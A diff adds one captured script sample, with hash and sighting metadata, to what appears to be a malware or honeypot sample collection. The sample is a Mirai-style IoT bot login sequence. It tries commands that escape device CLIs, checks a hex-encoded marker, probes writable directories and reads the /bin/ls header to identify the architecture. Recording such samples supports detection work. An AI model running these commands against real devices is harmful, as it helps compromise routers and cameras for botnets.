@@ -1,0 +1,22 @@
+# sha256: d7bf72abf4584711c3e045176f11e90a27e753df93c9926a742ccf2df4efd77e
+# family: script_generic
+# kind: script
+# size_bytes: 309
+# first_seen: 2026-06-02 10:37:31.013901 UTC
+# times_seen: 1
+# yara_matches: none
+# ------------------------------------------------------------
+
+start
+enable
+config terminal
+system
+linuxshell
+shell
+sh
+echo -e '\x62\x66\x71\x6F\x72'
+passwd
+cd /tmp || cd /var || cd /dev || cd /etc
+cat /bin/ls|more
+cat /bin/ls|head -n 1
+dd bs=52 count=1 if=/bin/ls || cat /bin/ls || while read i; do echo $i; done < /bin/ls || while read i; do echo $i; done < /bin/busybox
